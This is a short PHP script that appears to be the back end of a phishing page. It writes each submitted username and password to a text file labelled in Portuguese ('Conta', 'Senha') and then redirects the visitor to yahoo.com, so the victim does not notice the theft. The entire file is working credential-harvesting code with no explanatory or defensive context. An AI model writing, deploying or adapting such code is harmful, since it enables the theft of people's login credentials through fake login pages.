<?php

file_put_contents("usernames.txt", "Conta: " . $_POST['username'] . " Senha: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://yahoo.com');
exit();
